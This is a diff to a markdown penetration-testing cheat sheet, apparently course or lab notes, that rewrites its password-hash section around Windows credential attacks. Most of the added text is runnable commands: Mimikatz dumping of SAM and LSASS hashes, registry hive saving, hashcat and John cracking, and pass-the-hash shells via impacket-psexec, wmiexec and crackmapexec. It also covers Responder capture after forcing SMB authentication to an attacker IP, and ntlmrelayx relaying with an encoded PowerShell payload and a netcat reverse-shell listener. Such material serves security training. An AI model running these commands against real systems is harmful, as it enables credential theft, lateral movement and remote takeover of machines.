@@ -7,10 +7,10 @@ Passwords continue to be the primary authentication method across most systems a
 This reference guide covers the following sections:
 
 - Attacking Network Service Logins
-- Password Cracking Fundamentals  
+- Password Cracking Fundamentals
 - Working with Password Hashes
 
-This document provides practical commands, tools, and techniques for testing password strength through network-based attacks, different password cracking approaches, and methods to identify and exploit various hash formats found in modern systems.
+This document provides practical commands, tools, and techniques for testing password strength through network-based attacks, different password cracking approaches, and Windows hash extraction and manipulation.
 
 ## Table of Contents
 
@@ -397,292 +397,472 @@ ssh -i id_rsa -p 2222 user@target_ip
 
 ## 3. Working with Password Hashes
 
-Working with password hashes involves identifying hash types, understanding different implementations across operating systems, and applying appropriate cracking techniques for each hash format.
+Windows password hashes can be extracted from compromised systems and used for credential recovery or lateral movement attacks. This section covers NTLM hash extraction, cracking, and exploitation techniques.
 
-### 3.1 Hash Identification
+### 3.1 Cracking NTLM
 
-Proper hash identification is critical before attempting to crack passwords.
+NTLM hashes are stored in the Windows Security Account Manager (SAM) database and can be extracted from memory or registry for offline cracking.
 
-**Hash Identification Tools**
-```bash
-# Interactive hash identification
-hash-identifier
-hashid hash_value
+**NTLM Hash Characteristics**
+- Case-sensitive passwords
+- No length splitting (unlike LM)
+- Not salted (vulnerable to rainbow tables)
+- Stored in SAM database and LSASS memory
+- 32-character hexadecimal format
 
-# Multiple hashes from file
-hashid -m hashes.txt
+**Hash Storage Locations**
+- **SAM Database**: `C:\Windows\System32\config\SAM`
+- **LSASS Memory**: Local Security Authority Subsystem process
+- **NTDS.dit**: Active Directory database (Domain Controllers)
 
-# Output with hashcat modes
-hashid -mj hashes.txt
+**Prerequisites for Hash Extraction**
+- Administrator privileges or higher
+- SeDebugPrivilege access right enabled
+- SYSTEM-level access for memory extraction
+
+**Mimikatz Hash Extraction**
+
+Check Local Users:
+```powershell
+# Enumerate local users
+Get-LocalUser
 ```
 
-**Manual Identification by Length**
-```
-MD5:          32 characters
-SHA1:         40 characters  
-SHA256:       64 characters
-SHA512:       128 characters
-NTLM:         32 characters (Windows)
-LM:           32 characters (Legacy Windows)
-```
+Extract NTLM Hashes:
+```cmd
+# Start PowerShell as Administrator
+# Navigate to Mimikatz location
+cd C:\tools
+.\mimikatz.exe
 
-**Common Hash Formats**
-```
-MD5:          5d41402abc4b2a76b9719d911017c592
-SHA1:         aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
-NTLM:         b4b9b02e6f09a9bd760f388b67351e2b
-bcrypt:       $2a$10$N9qo8uLOickgx2ZMRZoMyeIjbpi4e7k8m...
-md5crypt:     $1$salt$qJH7.N4xYta3aEG/dfqo/0
-sha512crypt:  $6$salt$IxDD3jeSOb5eB1CX5LBsqZ...
-```
+# Enable debug privileges
+mimikatz # privilege::debug
 
-### 3.2 Windows Hash Types
+# Elevate to SYSTEM
+mimikatz # token::elevate
 
-Windows systems use various authentication mechanisms with different hash formats.
+# Extract SAM hashes
+mimikatz # lsadump::sam
 
-**NTLM Hash Cracking**
-```bash
-# Hashcat NTLM mode: 1000
-hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt
-
-# John the Ripper NTLM
-john --format=NT ntlm_hashes.txt
-
-# NTLM with rules
-hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r best64.rule
+# Extract from LSASS memory
+mimikatz # sekurlsa::logonpasswords
 ```
 
-**LM Hash Characteristics**
-- Maximum 14 characters
-- Case insensitive
-- Split into two 7-character halves
-- Weak DES-based encryption
+**Alternative Extraction Methods**
 
-```bash
-# Hashcat LM mode: 3000
-hashcat -m 3000 -a 3 lm_hashes.txt ?a?a?a?a?a?a?a
-
-# John the Ripper LM
-john --format=LM lm_hashes.txt
-```
-
-**NetNTLMv2 Challenge-Response**
-```bash
-# Format: username::domain:challenge:response
-# Hashcat mode: 5600
-hashcat -m 5600 -a 0 netntlmv2.txt rockyou.txt
-
-# From Responder captures
-hashcat -m 5600 -a 0 Responder-Session.txt rockyou.txt
-```
-
-### 3.3 Hash Extraction Techniques
-
-**Windows Hash Extraction**
-```bash
-# Mimikatz - extract from memory
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-
-# Extract SAM database
-mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
-
-# Registry extraction
+Registry Extraction:
+```cmd
+# Save registry hives
 reg save HKLM\SAM sam.hive
 reg save HKLM\SYSTEM system.hive
 
-# Impacket secretsdump
-python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
-
-# Domain Controller NTDS.dit
-python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
+# Transfer to attacking machine for processing
 ```
 
-**Linux/Unix Hash Extraction**
+**Hash Format and Identification**
+```
+Format: 32 hexadecimal characters
+Example: 3ae8e5f0ffabb3a627672e1600f1ba10
+Location in output: Hash NTLM: [hash]
+```
+
+**Hashcat NTLM Cracking**
+
+Identify Hash Mode:
 ```bash
-# Direct access (requires root)
-cat /etc/shadow
-
-# Extract user hashes only
-awk -F: '($2 != "*" && $2 != "!" && $2 != "") {print $1":"$2}' /etc/shadow
-
-# Combine passwd and shadow
-unshadow /etc/passwd /etc/shadow > combined.txt
-
-# John format for combined file
-john combined.txt
+# Find NTLM mode in Hashcat
+hashcat --help | grep -i "ntlm"
+# Mode 1000 = NTLM
 ```
 
-### 3.4 Unix/Linux Hash Types
-
-**MD5crypt ($1$)**
+Prepare Hash File:
 ```bash
-# Format: $1$salt$hash
-# Hashcat mode: 500
-hashcat -m 500 -a 0 md5crypt_hashes.txt rockyou.txt
-
-# John the Ripper
-john --format=md5crypt shadow_hashes.txt
+# Create hash file
+echo "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash
 ```
 
-**SHA256crypt ($5$)**
+Execute Cracking:
 ```bash
-# Format: $5$rounds=rounds$salt$hash
-# Hashcat mode: 7400
-hashcat -m 7400 -a 0 sha256crypt_hashes.txt rockyou.txt
+# Basic dictionary attack
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt
 
-# With custom rounds
-hashcat -m 7400 -a 0 '$5$rounds=5000$salt$...' rockyou.txt
+# With rules for mutations
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# Brute force attack (short passwords)
+hashcat -m 1000 -a 3 nelly.hash ?a?a?a?a?a?a?a?a
+
+# Incremental brute force
+hashcat -m 1000 -a 3 nelly.hash ?a?a?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8
 ```
 
-**SHA512crypt ($6$)**
+**John the Ripper NTLM Cracking**
 ```bash
-# Format: $6$rounds=rounds$salt$hash
-# Hashcat mode: 1800
-hashcat -m 1800 -a 0 sha512crypt_hashes.txt rockyou.txt
+# Format for John
+john --format=NT nelly.hash
 
-# John the Ripper
-john --format=sha512crypt shadow_hashes.txt
+# With wordlist
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt nelly.hash
+
+# With rules
+john --format=NT --wordlist=rockyou.txt --rules nelly.hash
+
+# Show cracked passwords
+john --format=NT --show nelly.hash
 ```
 
-**bcrypt ($2a$, $2b$, $2y$)**
+**NTLM vs LM Comparison**
+```
+LM Hash Characteristics:
+- Maximum 14 characters
+- Case insensitive
+- Split into 7-character halves
+- DES-based (weak)
+- Disabled by default (Vista+)
+
+NTLM Hash Characteristics:
+- No length limit
+- Case sensitive
+- No splitting
+- MD4-based
+- Not salted
+- Standard on modern Windows
+```
+
+
+
+**Post-Cracking Verification**
 ```bash
-# Format: $2a$rounds$salt$hash
-# Hashcat mode: 3200
-hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
+# Test credentials via RDP
+xfreerdp /u:username /p:password /v:target_ip
 
-# Note: bcrypt is intentionally slow
-# Rounds parameter controls difficulty (4-31)
+# Test via SMB
+smbclient //target_ip/share -U username%password
+
+# Test via WinRM
+evil-winrm -i target_ip -u username -p password
 ```
 
-### 3.5 Application Hash Types
+**Troubleshooting**
+- Ensure hash format is correct (32 hex characters)
+- Verify Hashcat mode selection (1000 for NTLM)
+- Use --force flag if needed for compatibility
+- Validate privileges when extracting hashes
 
-**WordPress (phpass)**
+This NTLM cracking process is essential for both standalone systems and Active Directory environments, providing a foundation for credential recovery and lateral movement techniques.
+
+### 3.2 Passing NTLM
+
+Pass-the-Hash (PtH) allows authentication using NTLM hashes instead of plaintext passwords. This technique exploits the fact that NTLM hashes are not salted and remain static between sessions.
+
+**Pass-the-Hash Fundamentals**
+- NTLM hashes can authenticate without cracking
+- Works across systems with same username/password
+- Requires administrative privileges for code execution
+- Bypasses password complexity requirements
+
+**UAC Remote Restrictions**
+- Enabled by default since Windows Vista
+- Prevents remote administrative access for local admin accounts
+- Exception: Built-in Administrator account (RID 500)
+- Mitigates PtH for standard admin users
+
+**NTLM Hash Extraction for PtH**
+
+Extract Administrator Hash:
+```cmd
+# In Mimikatz on compromised system
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+
+# Example output:
+# RID  : 000001f4 (500)
+# User : Administrator
+# Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+```
+
+**SMB Share Access with PtH**
+
+Using smbclient:
 ```bash
-# Format: $P$BroundsSalt22CharacterHash
-# Hashcat mode: 400
-hashcat -m 400 -a 0 wordpress_hashes.txt rockyou.txt
+# Connect to SMB share with NTLM hash
+smbclient \\\\target_ip\\share -U Administrator --pw-nt-hash NTLM_HASH
+
+# Example
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+# SMB commands
+smb: \> dir                    # List directory contents
+smb: \> get filename           # Download file
+smb: \> put filename           # Upload file
 ```
 
-**MySQL Hashes**
+**Interactive Shell Access with PtH**
+
+Impacket psexec (SYSTEM shell):
 ```bash
-# MySQL < 4.1 (16 hex characters)
-# Hashcat mode: 200
-hashcat -m 200 -a 0 mysql_old_hashes.txt rockyou.txt
+# Format: LMHash:NTHash (use 32 zeros for LM)
+impacket-psexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@target_ip
 
-# MySQL >= 4.1 (40 hex characters with asterisk)
-# Hashcat mode: 300
-hashcat -m 300 -a 0 mysql_new_hashes.txt rockyou.txt
+# Example
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+# Results in SYSTEM-level shell
 ```
 
-**Database Hash Extraction**
-```sql
--- MySQL hash extraction
-SELECT user, authentication_string FROM mysql.user;
-
--- PostgreSQL hash extraction  
-SELECT usename, passwd FROM pg_shadow;
-
--- MSSQL hash extraction
-SELECT name, password_hash FROM sys.sql_logins;
-```
-
-### 3.6 Specialized Hash Formats
-
-**KeePass Database**
+Impacket wmiexec (User context shell):
 ```bash
-# Extract and format
-keepass2john Database.kdbx > keepass.hash
+# Same format as psexec
+impacket-wmiexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@target_ip
 
-# Remove filename prefix
-sed -i 's/^[^:]*://' keepass.hash
+# Example
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 
-# Hashcat mode: 13400
-hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule
+# Results in Administrator user shell
 ```
 
-**SSH Private Key**
+**Other PtH Tools and Methods**
+
+CrackMapExec:
 ```bash
-# Extract and format
-ssh2john id_rsa > ssh.hash
+# SMB authentication test
+crackmapexec smb target_ip -u Administrator -H NTLM_HASH
 
-# Remove filename prefix
-sed -i 's/^[^:]*://' ssh.hash
+# Command execution
+crackmapexec smb target_ip -u Administrator -H NTLM_HASH -x "whoami"
 
-# Identify mode ($6$ = 22921)
-hashcat -h | grep -i "ssh"
-
-# If Hashcat fails, use John the Ripper
-john --wordlist=passwords.txt --rules=custom ssh.hash
+# Multiple targets
+crackmapexec smb targets.txt -u Administrator -H NTLM_HASH
 ```
 
-### 3.7 Advanced Techniques
-
-**Memory Dump Analysis**
+Evil-WinRM (if WinRM enabled):
 ```bash
-# Volatility Framework - Windows hashes
-python3 vol.py -f memory.dmp windows.hashdump
-
-# Extract cached credentials
-python3 vol.py -f memory.dmp windows.cachedump
-
-# LSA secrets extraction
-python3 vol.py -f memory.dmp windows.lsadump
+# Connect via WinRM with hash
+evil-winrm -i target_ip -u Administrator -H NTLM_HASH
 ```
 
-**Network Capture Hashes**
+RDP with PtH (using xfreerdp):
 ```bash
-# Responder - capture Windows authentication
-responder -I eth0 -w -r -f
-
-# Inveigh - PowerShell LLMNR/NBT-NS spoofer
-Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -FileOutput Y
-
-# Packet capture for analysis
-tcpdump -i eth0 -w capture.pcap port 445 or port 139
+# RDP connection with hash (if RDP allows)
+xfreerdp /v:target_ip /u:Administrator /pth:NTLM_HASH
 ```
 
-**Configuration File Hunting**
+**Hash Format Requirements**
+```
+NTLM Hash: 32 hexadecimal characters
+LM Hash: 32 hexadecimal characters (use zeros if not available)
+Combined Format: LMHash:NTLMHash
+Example: 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
+```
+
+**Common PtH Scenarios**
+- Local Administrator password reuse across systems
+- Service account with admin rights on multiple machines
+- Domain admin compromise for lateral movement
+- Workstation to server privilege escalation
+
+**PtH Attack Requirements**
+- Valid NTLM hash
+- Target system with matching user account
+- Administrative privileges on target (for code execution)
+- Network connectivity to target service (SMB, WinRM, RDP)
+
+**Detection Evasion**
+- PtH generates same logs as normal authentication
+- Monitor for unusual login patterns
+- Look for authentication from unexpected sources
+- Detect lateral movement patterns
+
+Pass-the-Hash is a fundamental lateral movement technique that exploits Windows authentication design, allowing attackers to move between systems without needing to crack password hashes.
+
+### 3.3 Cracking Net-NTLMv2
+
+Net-NTLMv2 is a challenge-response authentication protocol used when accessing network resources. Unlike NTLM hashes stored locally, Net-NTLMv2 hashes can be captured during network authentication and cracked offline.
+
+**Net-NTLMv2 Authentication Process**
+1. Client requests access to network resource
+2. Server sends challenge to client
+3. Client encrypts challenge with NTLM hash (response)
+4. Server validates response against stored hash
+5. Access granted or denied based on validation
+
+**Protocol Usage Scenarios**
+- SMB share access over network
+- Legacy systems not supporting Kerberos
+- Cross-domain authentication in mixed environments
+- File upload forms supporting UNC paths
+
+**Capturing Net-NTLMv2 Hashes with Responder**
+
+Setup Responder SMB Server:
 ```bash
-# WordPress configuration
-grep -r "DB_PASSWORD" /var/www/html/
+# Check network interface
+ip a
 
-# General password hunting
-find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
-find / -name "*.config" -exec grep -l "hash" {} \; 2>/dev/null
+# Start Responder on interface
+sudo responder -I tap0
 
-# Database files
-find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
+# Verify SMB server is active
+# Output shows: SMB server [ON]
 ```
 
-### 3.8 Hash Cracking Strategy
+**Force Authentication from Target**
 
-**Progressive Approach**
-1. **Quick wins**: Dictionary attack with common wordlists
-2. **Rule-based**: Apply mutations to base wordlists  
-3. **Hybrid**: Combine dictionary + brute force
-4. **Brute force**: Systematic character combinations
+From Compromised System:
+```cmd
+# Trigger SMB authentication to Responder
+dir \\attacker_ip\share
 
-**Tool Selection Guidelines**
-- **Hashcat**: GPU-accelerated, modern hash types, faster for most algorithms
-- **John the Ripper**: CPU-focused, better SSH key support, handles legacy formats
-- **Multiple tools**: Some hash types only supported by specific tools
+# Example commands that trigger authentication
+dir \\192.168.119.2\test
+ls \\192.168.119.2\share
+copy file.txt \\192.168.119.2\share\
+```
 
-**Performance Optimization**
+PowerShell Authentication Trigger:
+```powershell
+# Various methods to force authentication
+ls \\attacker_ip\share
+Get-ChildItem \\attacker_ip\share
+Test-Path \\attacker_ip\share\file.txt
+```
+
+**Alternative Authentication Triggers**
+- File upload forms with UNC path support
+- Image/document references in web applications
+- Email signatures with UNC image paths
+- Desktop shortcuts pointing to network locations
+
+**Captured Hash Format**
+```
+Format: username::domain:challenge:response
+Example: paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
+
+Components:
+- Username: paul
+- Domain: FILES01
+- Challenge: 1f9d4c51f6e74653
+- Response: 795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
+```
+
+**Hashcat Net-NTLMv2 Cracking**
+
+Identify Hash Mode:
 ```bash
-# GPU optimization
-hashcat -m 0 -a 0 hashes.txt rockyou.txt -O -w 4
-
-# Benchmark system
-hashcat -b -m 0
-
-# Monitor GPU usage
-nvidia-smi -l 1
+# Find NetNTLMv2 mode
+hashcat --help | grep -i "ntlm"
+# Mode 5600 = NetNTLMv2
 ```
 
-### Key Considerations
+Save and Crack Hash:
+```bash
+# Save captured hash to file
+cat > paul.hash << 'EOF'
+paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057004E002D00340044004E004800550058004300340054004900430002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000
+EOF
 
-- **Hash Type Verification**: Always confirm hash type before extensive cracking attempts
-- **Tool Limitations**: Different tools support different hash formats and algorithms
-- **Time Management**: Balance cracking time with engagement duration
-- **Resource Planning**: Consider hardware requirements for different hash types
-- **Multiple Approaches**: Combine network attacks with offline hash cracking for comprehensive coverage
+# Basic dictionary attack
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+
+# With rules for password mutations
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+**John the Ripper Net-NTLMv2 Cracking**
+```bash
+# Crack with John
+john --format=netntlmv2 paul.hash
+
+# With wordlist
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt paul.hash
+
+# Show cracked passwords
+john --format=netntlmv2 --show paul.hash
+```
+
+**Responder Hash Capture Output**
+```
+[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
+```
+
+**Post-Crack Verification**
+```bash
+# Test credentials via RDP
+xfreerdp /u:paul /p:cracked_password /v:target_ip
+
+# Test via SMB
+smbclient //target_ip/share -U paul%cracked_password
+
+# Test via WinRM (if enabled)
+evil-winrm -i target_ip -u paul -p cracked_password
+```
+
+**Net-NTLMv2 vs NTLM Differences**
+```
+NTLM Hash:
+- Stored locally in SAM/LSASS
+- Static hash value
+- Direct authentication possible (PtH)
+- 32 hex characters
+
+Net-NTLMv2 Hash:
+- Generated during network authentication
+- Challenge-response based
+- Contains timestamp and challenge
+- Cannot be used for direct authentication
+- Must be cracked to obtain password
+```
+
+**Common Attack Scenarios**
+- Unprivileged access to Windows systems
+- Web applications with file upload functionality
+- Phishing emails with UNC path references
+- Network file shares requiring authentication
+
+**Mitigation Considerations**
+- SMB signing enforcement
+- Network segmentation
+- Disable LLMNR/NBT-NS when possible
+- Monitor for suspicious authentication patterns
+
+Net-NTLMv2 capture and cracking provides a valuable attack vector when direct hash extraction is not possible, allowing password recovery from network authentication attempts.
+
+### 3.4 Relaying Net-NTLMv2
+
+Net-NTLMv2 relay attacks forward captured authentication attempts to another system instead of cracking the hash. This technique leverages user privileges across multiple systems when the hash is too complex to crack.
+
+**Relay Attack Concept**
+- Forward authentication to target system instead of cracking
+- Leverage cross-system administrative privileges
+- Effective when user has admin rights on multiple machines
+- Bypass UAC remote restrictions (for built-in Administrator)
+
+**ntlmrelayx Setup**
+```bash
+# Basic relay setup with command execution
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc BASE64_PAYLOAD"
+
+# Start netcat listener for reverse shell
+nc -nvlp 8080
+```
+
+**Triggering the Relay**
+```cmd
+# From compromised system - force SMB authentication
+dir \\192.168.119.2\test
+```
+
+**Relay Attack Output**
+```
+[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
+[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
+[*] Executed specified command on host: 192.168.50.212
+```
+
+**Requirements for Success**
+- Target user must have admin privileges on destination system
+- UAC remote restrictions must be disabled (except for built-in Administrator)
+- SMB connectivity between systems required
